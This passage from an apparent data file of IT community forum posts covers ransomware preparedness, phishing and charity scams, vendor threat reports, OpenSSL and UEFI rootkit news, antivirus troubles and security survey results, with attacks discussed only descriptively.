1733671,Paranoid about ransomware,"Our network is quite small and consists of 3 VMs on a single Hyper-V host. When I started here, there was no DR plan worth mentioning and I truly believe it was pure luck we haven't been hit by something before.I've since set up a second Hyper-V host and I replicate all three VMs to the failover host every 10 minutes. Neither Hyper-V host has any network shares (other than the default, system generated ones) and equally, none of my users have any access to the Hyper-V hosts' storage. In addition, I use the suberb Altaro Hyper-V backup to do a daily backup of my VMs, onto disks on my primary host. These backups are mirrored onto an external USB drive that is rotated daily.Further, I've implemented the rather excellent Crypto Canary, (https://community.spiceworks.com/how_to/100368-cryptolocker-canary-detect-it-early) and I'm cautiously optimistic that it'd give me quick warning of when an infection breaks out.My users are mainly pretty good, saving data to network folders, so I'm pretty confident that I have practically all our data protected.The idea is, when we get hit by ransomware (and yes, all my planning is done based on the assumption that getting hit is a guaranteed event) I would be able to fall back onto a number of defences.When alerted to an infection, the 1st step would be to isolate the VMs and prevent it spreading. The 2nd and equally important step would be to identify the source of the infection and get that machine disconnected and shut down.Following on from this, as soon as I am certain that I have a) identified and shut down that source, b) determined there are no other machines infected, I can then do a failover onto the replicated copy of the VM and bring the network back online. In a typical scenario, we shouldn't lose more data than what was created during the last 30 minutes, with that time frame quite possible being as low as up to 10 minutes.In an absolute worst-case scenario, where the infection somehow spread and infected the Hyper-V hosts (extremely unlikely, but factored into my planning) I'd have to restore from offline external USB drive and in such a case we may lose up to 24 hours of data.Obviously I have AV running on all endpoints, as well as on the VMs themselves, but depending purely on AV alone would be foolish.As I said, while being cautiously optimistic of avoiding an infection, all my planning is based on getting hit by ransomware being an absolute certainty, with the only unknown being when it will happen. This may seem paranoid, but I'd rather be paranoid than get caught with my trousers around my ankles!What other reasonable, cost-effective measures do you think I could implement here? What changes would YOU make to my strategy?",0
2068401,Scam Of The Week: Las Vegas Shooting Victims Charity,"And again—it is enough to make you nauseous—low-life scum on the internet is using a tragedy and try to scam money out of people that want to help the victims.The Nevada Attorney General’s office is investigating reports of fake online charities collecting donations on behalf of victims that were killed or wounded at a shooting at a country music festival in Las Vegas Oct. 1. Officials are partnering with GoFundMe and other social media sites to take down these fraudulent pages.There has been at least one Facebook page that has been shut down in light of the recent tragedy that was soliciting fraudulent donations. The Attorney General’s office is also aware of other complaints and pursuing those as well. “There continue to be sham charities and websites seeking to profit from this horrific tragedy,” said Nevada Attorney General Adam Laxalt. “Complaints from local consumers continue to be the best source of information for our Bureau of Consumer Protection in investigating claims of misrepresentation.”Steve Weisman wrote: ""Scammers will call you, text you, email you or set up websites with the intent to steal your charitable donations. In the case of phony charity websites, they are sometimes set up to appear to be those of legitimate charities with which you may be familiar"".At the risk of sounding like a broken record, I suggest you send employees, friends and family an email about this Scam Of The Week, feel free to copy/paste/edit:""Heads-up! Bad guys are exploiting the Las Vegas shooting. There are fake Facebook pages, tweets are going out with fake charity websites, and phishing emails are sent out asking for donations to bogus Vegas Charities.  Don't fall for any scams. If you want to make a donation, you can go to http://www.charitynavigator.org before you consider giving to any charity. This free website will let you know if the charity is legitimate or a scam. It will also tell you how much of what it collects actually goes toward its charitable work and how much it spends on salaries and administration expenses.  Do not click on any links in emails or text you might get.

2133881,NVR/Video Recording advice,"Hello everyone,My company has had some ongoing issues with our existing analog DVR, and we're looking to replace the whole system with a 32 IP camera NVR system. I'd like some advice and your experience with storing and streaming this much data.According to StarDot's Calculator, if we ran 32x 3 Megapixel cameras using H.264 at 7 FPS for 24 hours a day, it would take about 25TB to store this, and would use about 76 Mbps on the network. Do these numbers seem accurate? How much storage should we expect to need to store 30 days of footage using these specs?Ideally we would like to store this footage in ""the cloud"", but seeing as S3 costs about $550 a month for 25TB of data (not counting the sheer amount of bandwidth that would use) it seems like that might be prohibitively expensive for us. Are there any cloud surveillance footage providers that could affordably work with 32x 3 Megapixel cameras?Any advice or experience is appreciated. Thanks!",0

2106704,Another phishing story,"I once caught a phish, and it was this big...Did some work for a small business back in November, and then submitted a bill. I was promised that I'd be paid, but when nothing had arrived by first week of December, I sent an email to gently remind them. They promised it would be done. As I still hadn't had anything, last week I sent an email to the PA to get her to dig him in the ribs. Subsequently, he printed off a set of emails, and a shot of the payment via his bank. Only problem; looking at the emails, it's not my address. There is a full stop in the name, so a first glance it looks like my address, but it's actually not. I spoke to him about it, and he immediately went on to his bank. In the mean time, it looks like his email has been compromised and someone else is reading them. They've falsified an email to him using this fake address, and given him a set of account details that are not mine.Rather than sit doing nothing, I did some investigation, and actually spoke to the bank that appeared in the email. Ended up being passed on to their fraud team. They confirmed that the account was active, but in a different name and address to mine. They've now put a block on the account, and I believe have spoken to the police. Someone might well be getting his collar felt in the next few days.Hey ho, such is life!",11

Just recently I was reviewing my Malwarebytes console and seen one computer had been trying to contact several IP addresses from the same block. However Malwarebytes was blocking it from doing so. I perform an WHOIS IP, and the results come back as Conduit USA\ Perion. The next day Malwarebytes detects a rootkit on this same computer. I would assume that Conduit is somehow related to this rootkit malware which is very dangerous. I am astounded that Conduit is still able to do business legally in the United States. And even using the name Conduit. Now they are backed by Perion. How does this happen? Someone, well more than just someone, the majority of the legitimate computerworld users need to take a stand and bring companies like this down.  I am sure Conduits answer is ""we just make browser software"".

Do you pay the ransom it demands? Or is there another way out? That's the question a not-for-profit organization was confronted with after 75GB of critical data was made unusable. According to Information Age, the organization paid ""the CryptoWall ransom ... via Bitcoins, just as instructed."" This is not to say the company didn't have a disaster backup plan. With ""seven servers servers supporting the not-for-profit's operations, the IT team quickly sprang into action after an admin clicked on a phishing link"" that, unknown to him, brought CryptoWall into the network. And even with backups, performing a full recovery ""would have taken days."" Even after the ransom was paid, the entire decryption process still took the IT team 18 hours to perform.This is not to say that the IT team was unprepared – they were. But CryptoWall has crippling effects that go beyond the normal scope of malware. Even with recovery plans in place, the timeframe in which CryptoWall brought the organization to its knees was swift, brutal, and sharp. All files were encrypted in less ""than an hour,"" according to Information Age. And while Information Age gives their own advice on how to avoid such attacks – avoid suspicious emails, be aware of what phishing is, know the risks – and, should the worst happen, stand prepared for such an attack with quick and ready recovery plans in place, I want to know: What would you do? Are you prepared? How would you prepare?While the obvious answer might be to educate users on what phishing is, how to avoid it, and why it's dangerous, it's fairly obvious that, at the end of the day, it happens – if the result is CryptoWall, what will your next step be?",11

1532707,Threat Spotlight – Samsa/Samsam Ransomware,"Not an April Fool unfortunately. Yes Spicefolk, the bad guys continue to spread their bad stuff. The latest round of Ransomware that is getting headlines is called Samsa. Or Samas. Or SamSam. Are you noticing a theme here? Our intrepid research team is on the case though! Dig it:Threat Spotlight – Samsa/Samsam RansomwareThe Samsa ransomware family has recently been observed in conjunction with several notable and high-profile attacks. Also known as ‘Samas’ and ‘SamSam,’ this particular ransomware’s targeting appears to focus primarily on the healthcare industry, but confusingly, there are Samsa campaigns that deviate from that focus as well. While many outlets are speculating on which attacks are associated with this threat family and which are not, we would like to focus on one of the more intriguing aspects of the attacks.One thing that has become clear recently is that the actors behind Samsa are taking a unique and ‘hand-on’ approach to their targets/victims. That fact alone sets these campaigns apart from most of the others that have hit the news lately. We’ll go into some high level detail on that at a later date, along with releasing a more detailed analysis of this threat family and the actors behind it. With this update, we aim to show our customers and the public that, as with other recent (and equally destructive) threats, CylancePROTECT is able to entirely prevent execution of the ransomware and stop Samsa cold. Cylance’s technology is 100% effective in preventing known Samsa executables from running, and all risk to critical files and data is mitigated. All this, with an approach above and beyond traditional signature-based AV products, which are in a constant industry-wide game of ‘catch-up’.Samsa Attack Methodology – High-Level OverviewAs stated previously, the approach used by the attackers in these campaigns is far more involved than other ‘ransomware-centric’ attacks that have hit the news lately. For starters, Samsa employs multiple tools for its initial infection, lateral movement and reconnaissance. There are also different variants of the encryption frameworks used over time, as well as across different victim environments.  Initial access is gained by compromising external-facing servers (such as exploitation of unpatched vulnerabilities on web or authentication servers where external interfaces are exposed). This approach differs from other ransomware variants (Locky, Petya) in that the point of entry is not a phish/spear-phish email. Once the attackers have gained entry by way of the vulnerable service of their choosing, they then use a variety of standard Windows commands, benign tools, and other custom-built tools to move laterally and establish persistence.In several of the environments Cylance analyzed, the first compromised host was used to scan and map out the internal network and plan the next set of movements within, as well as determine what options were available with regards to internal exploitation and manipulation. Often, artifacts of this activity were present in the compromised machine in the form of sets of batch files, SQL scripts, and data files that recorded the output of these actions:Figure 1: Samsa artifacts 1Figure 2: Samsa artifacts 2Figure 3: Samsa artifacts 3Figure 4: Samsa artifacts 4Once internal hosts are identified and accessible, the next stage of infection begins. A keypair is generated for each host targeted, and the public key (along with required scripts and the ransomware binaries themselves) is distributed.In some environments, we observed the use of standard tools (for example, psexec.exe) to launch the ransomware binaries (Samsam.exe). There are reports of Volume Shadow Copy Service (VSS) data being deleted. The examples provided in FBI FLASH MC-000070-MW[1] do in fact confirm this functionality.The Test: CylancePROTECT vs. SamsaRegardless of the methodology involved, the end result of infection by Samsa ransomware is inevitable: malicious executables are allowed to run on the compromised victim hosts. Traditional antivirus (AV) products and technologies based on signatures have a very low detection rate on this particular threat family. It takes days (if not weeks) for their signatures to finally catch up, which as we know, is days/weeks too late. When ransomware executes on your machine, a waiting time of even a fraction of a second is too late. When a new ransomware variant is released, you simply can’t afford to wait a day or longer for your tradition AV vendor to analyze files returned by their infected clients, manually create a signature ‘antidote’ to that variant and release it… which is in essence how traditional antivirus works.  Cylance tested samples of Samsa (and some of the related malicious executables) - the results of this testing showed that CylancePROTECT is 100% effective against known Samsa executables. And all without downloading/ updating signatures, or analyzing/ observing the files prior to infection and attack.It is our purely mathematical, machine-learning-driven approach that allows us to stop these attacks BEFORE they are allowed to execute, thus preventing any damage to your data - or worse, in the recent attacks on medical environments, downed systems and the subsequent delays that may directly impact patient health and human life.Cylance’s researchers have released a video showing CylancePROTECT in action, stopping multiple variants of SamsaBelieve the math!!Indicators Of Compromise (IOCs) – Samsa SHA256 Hashescbc973f53ad2edcc316671785d41c96b3176efdc7369d9d94d4183d3f78318b0a763ed678a52f77a7b75d55010124a8fccf1628eb4f7a815c6d635034227177e7aa585e6fd0a895c295c4bea2ddb071eed1e5775f437602b577a54eef7f61044ee1c0ca9787228d35a17e0083f05eba0146616f0543787b29bd567069a295e57337b0532c035d5ff7575d749742029a1f86461d2391a324194086be1558f041376dec6a3719af5265d35e3fa9793972b96ca25a1d70a82a4ca0c28619051f48b45e00fe90c8aa8578fce2b305840e368d62578c77e352974da6b8f8bc895d75b5e7ab76187c73780cd53a6e2b9d0c9b4767172543ee56e7dc8cf4e8093fc6729939efdc272e8636fd63c1b58c2eec94cf10299cd2de30c329bd5378b6bbbd1c8b4d9339aa4df8abae92edf4bba969bec9dba06c9c9acf59214e6aeb258cae2eaffef0f1c2df157e9c2ee65a12d5b7b0f1301c4da22e7e7f3eac6b03c6487a62689b4abb78970cd524dd887053d5bcd982534558efdf25c83f96e13b56b4ee805979692a34201f9fc1e1c44654dc8074a82000946deedfdf6b8985827da9928680f2c5c39494f15b7ee637ad5b6b5d00a3e2f407b4f27d140cd5a821ff08acfac58ef87523184d5df3ed1568397cea65b3f44df06c73eadeb5d90faebe4390e3e7e69b0c6b97c2e116e492f641c836d9d36093cefa3ed7ee53fcaa052bedcde536bc2aa391b8ef260e79b99409e44011874630c2631e4487e82b76e5cb0a49307362b1db3a7a36cbcf73554f0dbf63450d99e7f1e2b58b6d9bc375da080bdde3047f9d6aa6e14e20efa8732ed9228e1806316c31a2fa5a359f30693c3ccbf03408c44b91b4f583c9042f100e197df6a0e5a8efc0f5032cb02f6ff9b505badb557e682ac6b874e0a6cfc5ff88798315b2cb822d165a7e6f72a5eb74e6da451e155f92bf62e6ab099fb2817e0c598b8fdf2882de464205da09fcd2937691a160f0c036071786d7db553e2415ec2e71f3967baf51bdc31d0a640aa4afb87d3ce3050946dd4c4f3c78e7e4819a712c7fd6497722a3d616d33e3306a556a9dc99656f4e92d8dddeaa037ba22c5a004bba2e81e764fd38e6b49875c416810a619193976972a15202a58786f1e5a5d17d307fdae28bbb3569e084c405100df645c84b10eAdditional Resources:US-CERT Alert (TA16-091A): Ransomware and recent variantsAmerican Hospital Association : What hospitals need to know about ransomware﻿﻿There you go.

1592368,OpenSSL patches two high-severity bugs,"The OpenSSL Project has patched versions 1.0.1 and 1.0.2 of OpenSSL, fixing two severe flaws in the cryptographic library that ""make it possible for attackers to decrypt login credentials or execute malicious code on Web servers."" Due to severity of the flaws, the OpenSSL Project advises that its patches be applied as soon as possible. ""The decryption vulnerability is the result of what cryptographers call a padding oracle weakness, which allows attackers to repeatedly probe an encrypted payload for clues about the plaintext content inside,"" Ars Technica reports. This particular bug — CVE-2016-2107 —﻿only allows 16 bytes of encrypted traffic to be intercepted at a time, making for a less severe risk than other padding oracle bugs. According to OpenSSL, it was introduced in 2013 when OpenSSL ﻿maintainers ironically patched a different padding oracle bug in the cryptographic library, which was called Lucky 13. The other bug — CVE-2016-2108 —﻿ ""causes memory corruptions, a weakness that may allow attackers to execute malicious code."" By themselves, neither this bug is dangerous. Together, however, attackers can use them in tandem to execute malicious code. ""Every OpenSSL release since the infamous Heartbleed vulnerability of April 2014 has been met with nervous anticipation, and that applies as much to the upcoming... releases as others before it,"" The Register writes. ﻿The last significant vulnerability in OpenSSL was DROWN, which was disclosed in March 2016. ",0
1825071,Sophos Central Server Protection Lockdown Feature,"Hi,I'm reaching out to see if anyone has any experience with Sophos's Lockdown feature available in Sophos Central Server Protection Advance?I've been trialing the product for use on our Remote Desktop Session Hosts servers as a way of application white-listing, however I have a few issues. Maybe some Sophos reps could chime in? I have reached out to support but so far they have not responded to this particular issue.It seems you can only add additional applications to an allowed list which explicitly trusts the application to run and modify other files. It does not allow you to specify additional applications to have run only permission. What this means is if you add an application to the list (for example an application that runs from a network location) that application then has permission to launch any other application without restriction. As an example, if the application you add to the allow list has an online help button that launches a website in the browser, you can click that to circumvent Sophos Lockdown and download and execute any executable/script from that browser session.The use case here is that we have a DMS that resides on a network location, which when executed mirrors itself to a local location and then runs from there. The problem is that there is no way to allow that executable at the network location to run without adding it to the allowed files/folders list which them means anything the application does is trusted as far as launching other programs etc.This seems to leave a large hole in the security of the Sophos Lockdown feature. This may be a bit of a unique use case, however it seems like a basic feature to be able to add an application to a list that allows it to just run and not trust it to run any other applications.",0

582303,We Are At War In The Digital World,"I just read an opinion editorial in the Wall Street Journal that really did clarify the new threat we are faced with the last decade. ""Ten years ago, the 9/11 Commission Report triggered the most significant reorganization of the U.S. intelligence community since 1947. Two months ago, the former members of the commission—we are among them—issued a new report assessing where national security stands, 13 years after the most devastating attacks on America's homeland.Most of the new report's observations focused on counterterrorism, the central focus of the 9/11 Commission. But in speaking with many of the nation's most senior national-security leaders, we were struck that every one of these experts expressed concern about another issue: daily cyberattacks against the country's most sensitive public and private computer networks. A growing chorus of national-security experts describes the cyber realm as the battlefield of the future. We are at war in the digital world. And yet, because this war lacks attention-grabbing explosions and body bags, the American people remain largely unaware of the danger. That needs to change."" Could not have said it better myself, and am thrilled to see this in the WSJ, because it needs to penetrate into the C-level suite. Messrs. Kean and Hamilton served as chairman and vice chairman of the 9/11 Commission and make the case for a National Cyber Commission, and a a National Cyber Center, which would bring together government and private experts to ensure unity, similar to the National Counterterrorism Center, created 10 years ago in response to a 9/11 Commission recommendation, which is working well.""In recent months, we have heard time and again from leading experts that the cyber threat is serious—and that the government is not doing enough. One lesson of the 9/11 story is that, as a nation, we didn't awaken to the gravity of the terrorist threat until it was too late. We must not repeat that mistake in the cyber realm.""  Article in WSJ (paywall):http://online.wsj.com/articles/tom-kean-and-lee-hamilton-a-new-threat-grows-amid-shades-of-9-11-1410390195",11

1531339,Fire Alarm Panel for Our New Building Using a Wireless Signal?,"We have a new facility coming online soon (manufacturing plant with welding and paint).  The company we use for fire alarm monitoring is recommending we put in an AES 7788F radio with 3DB antenna.  The fire alarm panel is in the telco room of the building, and they would try to use the antenna inside the building before moving it to the exterior.  They did a signal test recently and found our facility here in Fort Worth within range to dial back to dispatch in Richardson.  Is anyone out there using one of these instead of a fire alarm panel that needs analog lines? This is supposed to be approved by the fire department (and is better than a cell signal according to the vendor).  It operates at a lower frequency than most cellular frequencies (450 - 470 MHz) which seems to be reserved for public safety from what I can tell - https://www.apcointl.org/spectrum-management/resources/spectrum/low-power-450-470-mhz.html.﻿This will save money on the cost of two analog lines, but our Maintenance team does not know enough about it to know if it is the right solution.  And is there some kind of special permit we must have to use this technology, or will a valid fire inspection do the trick?If you use one of these or something similar and can give some feedback, I would love to hear it.",0

287496,Anyone else find Kaspersky Endpoint 8 to be the biggest pain ever?,"We've been working on upgrading our network of systems (About 380 systems) for quite some time now. We were using Kaspersky AV6 with no issues. Deployment was easy software just worked. When it came time to renew our AV the higher ups decided it would be a good idea to use the Endpoint 8. Biggest pile of .... I have ever used. First you can't just upgrade even though Kaspersky will swear up and down it will upgrade with no problems (When 10/10 systems fail to upgrade each and every time, no it can't upgrade.)Next after much troubleshooting and breaking down the process into an 8 step process (1. Uninstall the AV62. restart3. uninstall the agent 84. install the agent 95. install endpoint 86. restart7. manually start endpoint 8 because it wont start on its own 50% of the time8. move systems to proper managed folder because the installer fails 100% of the time to move it to the designated folder it was assigned to go to)it still fails to deploy at least 50-70% of the time. It can take up to 8 tries to deploy and we've found its faster to just kick the users off their computers and manually install. Group policy deployment is a pain as it still fails and will not properly check if its already installed before trying to install the software so you either make multiple groups or reinstall on the same users systems over and over and over again.We've created at least 20 tickets about the issues and so far Kaspersky's response has been its our workstations, or its our servers, it must be an issue with our network, our windows doesn't have the latest Intel drivers for the hard drive (which they sent us a driver version to use for XP even though we are using Win 7 and have the latest intel drivers). They have also said its a Microsoft problem as to why their software msi fails over and over and over again. That its not a problem with their software but everything else associated to our network. The Security Center gives different reasons why it failed to deploy, usually somewhere along the lines of the computer is no longer on the network (Yet we can ping it no problem),the account password is wrong (Yet it works on other workstations during the same deployment...funny huh?),Installation completed with an error (which is called the msi failed horribly couldn't run and gave up and never actually installed and you will have to try again),or installation completed with an error please restart your computer (which means it installed but the software will not start on its own and we all know how useful antivirus is that has to be manually started)They kept trying to blame the computers saying there must be an issue with the systems and try troubleshooting them...really because they came out of their box (in this particular case) 3 days before installing the Endpoint in place of the AV6. I'm sure Dell ships all their top of the line optiplex systems with severe issues that stop only Kaspersky software from deploying properly. Their final solution was go to each users computer and change the path variable in Windows...which saves us time from manually installing on each system how considering there are only two people doing the deployment over 4 locations.Under the Security Center it has no idea how to monitor the computers. For example we have 4 user machines and a server it always says protection is off. So we right click on the device click protection and it will show a status like""Protection is offNot Scanned for a long timeDatabases are outdatedNot connected for a long time""Real-time protection status : UnknownLast on-demand scan: 7/31/2012 Yet if we go to applications it shows Kaspersky Endpoint is runningWe look at the date of the last system scan and its at 5:32am this morningNot connected for a long time which apparently per the last visible date is anything over 8min agoWe check the daily system scan task list and shows clearly that the scan started on the users machine at 5:32am and finished at 5:53am. Yet it hasn't been scanned for a long time...So maybe just maybe the definitions are out of data...nope definitions are from 2:41pm the day before.  I have never been so frustrated with a companies software in all my life...has anyone else felt the cold shoulder of Kaspersky and their send us a log for EVERY system that has had and issue then they wonder why you don't use their solution on the system you had problems with last week...",11

2165326,First Reported UEFI Rootkit in the Wild,"ESET researchers have shared info on what they are saying is the first UEFI rootkit found in the wild.  This malware is called LoJax.  What is stressed in this article is that LoJax isn't new, and UEFI access isn't new either.  LoJax has been around since early last year, and UEFI access was first given credit in 2015.  What is new is that this is reported to be the first instance of it being used in the wild.LoJax is modified code of the LoJack, which is how it's able to get into the system for persistence.  Why this is an issue is that once code is in the UEFI, it'll stick around even after a reformat. Since UEFI rootkit is not properly signed, users can protect themselves against LoJax infection by enabling the Secure Boot mechanism, which makes sure that each and every component loaded by the system firmware is properly signed with a valid certificate.If you are already infected with such malware, the only way to remove the rootkit is to reflash the SPI flash memory with a clean firmware image specific to the motherboard, which is a very delicate process that must be performed manually and carefully.Alternative to reflashing the UEFI/BIOS, you can replace the motherboard of the compromised system outright.Be vigilant!Source: https://thehackernews.com/2018/09/uefi-rootkit-malware.html, https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf",12
1668724,How's the government doing?,"A year after the personal data of 22.1 million people was stolen from the office of Professional Management, a survey has come out saying the federal government has a long way to go with respect to cybersecurity. http://cdw.io/SEMnwY﻿",5
2048806,Top Cybersecurity Risks 2017,"Past years have been too crowded with cybersecurity events. A lot of financial, health care, government and social media data were compromised. Systems failed and services were disrupted. TV shows were leaked online before the official release. Last of all, there were ransomware crusades. Every week, there is a new adversary: a state, an individual or an international group of hackers. It seems impossible to find anybody who has not been directly affected by any of the IT threats, or at least at risk. Some businesses received publicity they definitely wished they would not get.But what dominates the press and what bothers IT pros on a daily basis are not necessarily the same thing. For this reason, every year, we conduct a survey to identify what IT risks organizations and IT departments face during their everyday work. These risks are usually related to cybersecurity, operations and regulatory compliance. We are interested to learn more about the processes and widely used practices, as well as IT pros’ perceptions of the greatest IT threats and how well they are ready to beat cybersecurity risks.This year, we received feedback from 723 IT pros from various industries and countries. We asked them about the information security threats they face every day and analyzed the results.What Is the Current State of Cybersecurity?First, let’s take a look at the context within which the surveyed IT departments operate and deal with cyber risks. The absolute majority of respondents said that they use some security software, but only 13% of respondents use advanced solutions for information security governance and risk management. Also, we got confirmation of what our customers tell us: More than half of organizations lumber their IT departments with all kinds of IT-related tasks. These include not only stable operations of IT systems and business user support but also cybersecurity, reporting and compliance.Now we will go a little deeper and find out how much our respondents know about what is happening in their IT infrastructure. Here we see that not all areas of IT are created to be equally loved. Organizations tend to have pretty good visibility into endpoint, virtual infrastructure and on-premises systems, with more than half of organizations being fully aware of what is happening there. At the same time, they still struggle to control BYOD policies and shadow IT (two of the typically most difficult areas), as well as – surprisingly – unstructured data stored in third-party data centers.One third of organizations don’t know what is happening with their data in third-party data centers at all, and only a quarter of respondents said they have complete visibility into it. Startling, isn’t it? How about the rest of the corporate data? Things are not much better for the unstructured data stored on premises: Only 32% of respondents have complete visibility into user activity around it. Respondents mostly have visibility into activity in databases (and 52% of them stated that visibility is complete). To sum up, visibility into unstructured data, regardless of its location, leaves much to be desired; visibility into the databases is better, but only for half of respondents, which is still far from perfect.Where Does Visibility Matter the Most?With that said, the question remains: Where is visibility critical and where is it not? Respondents indicated that visibility is the most critical for on-premises systems, cloud systems and mobile devices. Visibility into data takes the last place in this rating. With all the breaches we hear about, it’s startling, that visibility directly into activity around data and data access for the majority of organizations is less significant than visibility into systems and devices.If organizations are more preoccupied with the perimeter defense, does it mean they see hackers as the main threat for cybersecurity? Yeah, well, no. According to our respondents, the greatest cyber security threat comes from those who have legitimate access to the internal systems: employees (66%), vendors, contractors, partners and other third parties (9%). Only a quarter of all surveyed IT pros indicated hackers as the main threat.Where Are the Biggest Information Security Threats Coming From?Is the statement that employees represent the biggest risk only a perception or actually the fact? Let’s look at the real incidents that happened in 2016. The main causes of security incidents were malware and human errors. In the case of malware, as we know, it is often unintentionally launched by employees when they click on links they should not. Only about 8% of companies said they experienced external intrusions or unauthorized access. The main reason for operational issues in 2016, such as system downtime, was improper or malicious activity. All of these findings lead us to conclude that organizations mostly have security and operational issues due to lack of visibility into user activity.Speaking of visibility into what users are up to, it is also required for compliance reasons. Half of the companies that have to comply with regulations experienced problems with passing audits. The majority of the issues were attributed to the inability to provide a complete audit trail of user activity around sensitive data as evidence of compliance.With so many issues caused by the lack of visibility, what do organizations say about the actual value of infrastructure transparency? The absolute majority of them claimed it helps to detect and mitigate the human factor, which includes both unintentional actions and errors and malicious misuse. Another two of the most cited values are efficient investigations of security incidents and maintaining the overall security of the IT environment.Even though there are a lot of positive tendencies in gaining visibility and fighting cyber security risks compared to the data we received last year, still only about a quarter of respondents claimed their organizations are well prepared to beat cyber risks.What Are the Main Obstacles on Your Way to Information Security? The most common reasons others are not so sure about their ability to combat information security threats are lack of budget and time and insufficient staff training, or, in other words, the notorious human factor.  So, what are organizations planning to do next? Most of them have built a more or less successful perimeter defense and realize that people with excessive privileges may do more harm (again, intentionally or inadvertently) to sensitive data or business continuity than an adversary from the outside. Also, prevention of each and every possible threat is not at all possible, even with the unlimited resources. With all that in mind, IT pros place securing data among their most important goals on the agenda. About a third of respondents were absolutely ready to invest in protection against data breach, intellectual property theft and fraud.In general, as I mentioned earlier, tendencies this year are positive, and we see a lot of improvements in how organizations prepare themselves to handle cyber security risks. Despite the obstacles, unsolved issues, ever more rigorous compliance requirements for cybersecurity and so on, organizations have been taking a more integrated approach to dealing with cyber risks and protecting valuable assets.View the full 2017 IT Risks infographicsView full 2017 IT Risks Report",12

722492,Reaffirming Symantec’s Commitment to Security and Privacy for the Online World,"Last year was a pretty incredible year when it comes to all things cyber security.  While Symantec was doing a lot of work all over the world, we didn't always let folks know what we were doing or where we stand on specific questions.  Last month, Scott Taylor, Symantec Executive VP General Counsel and Secretary, dropped this blog talking about what we are doing and where we stand.  Dig it:Reaffirming Symantec’s Commitment to Security and Privacy for the Online WorldAs the largest security software company in the world, Symantec has earned the trust of consumers, businesses and governments alike to secure and manage their information and identities. We place the highest priority on maintaining this trust and believe it is imperative to be transparent about our business positions as questions arise across the globe on data security and privacy. We have always been clear that:Symantec does not introduce hidden functionality (back doors) in its technologies.Symantec does not whitelist malware in its security solutions.As a Certificate Authority, Symantec does not keep copies of encryption keys that its customers use. Consequently, Symantec does not have the ability to comply with requests to produce such keys.Symantec uses the highest known standards for encryption and we believe that our encryption technology is secure and has not been undermined.  Symantec is committed to complying with all relevant rules, laws, and regulations in the countries where we operate. When requested by a lawful authority to share customer data, Symantec will only do so following the appropriate due process of law. In such cases, Symantec will endeavor to be transparent with its customers to the extent permissible by applicable law.Symantec has stated publicly that we will collaborate with authorities to share information on cyberattacks in order to facilitate the detection and prevention of cybercrime. We believe this benefits our customers and the global community at large. There are a number of examples where Symantec has contributed to the disruption of cybercrime activities through cooperation with law enforcement around the world. Among these were the recent takedowns of financial fraud botnet Gameover Zeus and the ransomware network Cryptolocker. Both were used by cybercriminals to steal tens of millions of dollars by compromising millions of computing devices.Around the world, companies are being put in a position to have to choose whether they should comply with one government’s law or break another’s. The broader issue of state surveillance is putting companies in the middle of national security debates between sovereign governments. We welcome a discussion among the international community focused around the permissible boundaries of government security activities on the Internet. It is important, however, that the conversation focuses on solutions and transparency and that it does not become a finger-pointing exercise. To be clear, we enter this dialogue with the strong and long-held belief that the infrastructure underlying essential Internet functions should be trustworthy. Commercial software and hardware should not be targets for intelligence collection or manipulation.The role of industry in a globalized economy is to promote technological innovation and economic growth. Unfortunately, we see governments using national security as a justification for protectionist agendas. The public debate on surveillance is necessary around the world, and for that debate to be effective the participants should not use it to advance unrelated agendas or to make their points at the expense of the private sector.The bottom line is that companies should not become the long arm of intelligence for any government, nor should they be perceived as such by their customers. Such perceptions risk undermining the trust on which the Internet and its underlying technology have been built.Equally, the role of government is to ensure national security, the protection of individual privacy, and the economic well-being of its citizens. However, neither of these objectives will be served in the long run by restricting the ability of industry to reach national markets or to take advantage of economies of scale by limiting global data flows.Symantec remains committed to maintaining the trust we have earned, to being a constructive participant in the fight against international cybercrime, and to contributing to the global dialogue on security and privacy.﻿﻿﻿As always, if you have questions or need more information about anything Symantec related, please feel free to contact me or any of our Green Guys/Gals either in the forums or via DM.¡﻿SI SE PUEDE!",0

We had a file server completely lose all ability to connect to the network yesterday, which was repaired completely by uninstalling SEP.  We've now had several machines where SEP won't run and we can't repair or uninstall so we end up using the Cleanwipe tool.

1666313,What are you using to log events?,"I'm looking for a good log aggregator that can pull together logs from switches (all of which are running some variant of Linux), firewalls, and Windows servers (including their event logs) into one platform that can be sifted through as needed. We are a small department relative to the needs of the company and can't spend time looking at logs all day long, but are willing to learn and tune the logging as needed to reflect what's important to us (security events and system errors being at the top of our list).I need to do some more research, but so far the logging solutions I've tried (Papertrail, Kiwi) rely on very manual tuning before you can get something workable. While we can do this, I'd be interested in finding out if there is a solution (at a reasonable price that isn't overkill) that can intelligently match the logs against a database somewhere and tell us what events we DEFINITELY should be paying attention to. What is everyone using to log events and monitor their network, and what are your recommendations/ideas? ",0

After looking into why both programs were conflicting with one another, researchers discovered that AVG antivirus ""creates a memory space with full RWX (read-write-execute) privileges where it normally runs,"" ﻿﻿and which is ""often shared with other applications."" ﻿The shared memory space, which can be used to bypass any other system security measures, was later found to affect McAfee and Kaspersky as well. In a blog post, enSilo says ""this issue is not necessarily constrained to security solutions, but potentially to any intrusive application such as data leak prevention (DLP) and performance monitoring solutions."" ﻿enSilo has released a free utility called AVulnerabilityChecker on GitHub that will check systems for the flaw.

2020560,CEO Fraud Attacks Were Far More Lucrative than Ransomware over the Past 3 Years,"Cisco's midyear report released this week showed that CEO Fraud netted cybercrime five times more money than ransomware over the last three years.The surprising highlight of Cisco's ninety page report was that cybercrime made $5.3 billion from CEO Fraud attacks --called business email compromise (BEC) by the FBI-- compared with a ""mere"" $1 billion for ransomware over a three-year stretch,Organized Eastern European cybercrime is more and more taking the ""time is money"" approach, in this case billions, says Steve Martino, Cisco's chief information security officer. ""What we are looking at is the continual commercialization of cyberattacks,"" Martino says, pointing out that is a major theme in the report.Malicious ransomware takes time to develop and extensively test before any net Bitcoin comes into the wallet, compared to doing a quick bit of research on LinkedIn and crafting a spoofed spear phishing attack. CEO Fraud simply is faster to pull off. Moreover, your run-of-the-mill spray-and-pray ransomware attacks are often lower-dollar numbers.Schooling Users on CEO Fraud and RansomwareCisco's Martino says targeted cybersecurity education for employees can help prevent users from falling for CEO Fraud and ransomware attacks. The finance department could especially benefit from security training on phishing campaigns, so when the bogus email comes across the transit of the CEO asking for a funds transfer it can be detected, Martino says.Regular software patching also is crucial. When spam laden malware hits or ransomware attacks similar to WannaCry surfaces, the impact can be minimized. ""People focus on new technology, but forget about patching and maintaining the infrastructure,"" Martino observed.And a balanced defensive and offensive posture, with not just firewalls and antivirus 